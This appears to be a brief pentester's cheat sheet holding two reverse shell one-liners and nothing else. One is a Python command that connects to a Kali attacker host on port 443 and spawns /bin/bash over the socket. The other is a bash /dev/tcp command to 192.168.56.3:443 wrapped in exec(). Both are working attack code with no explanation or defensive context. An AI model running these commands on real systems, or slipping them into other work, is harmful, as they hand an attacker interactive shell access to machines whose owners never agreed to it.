# Python : one liner reverse shell 
```
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Kali-IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

# bash One liner shell
```
exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.56.3/443 0>&1'");
```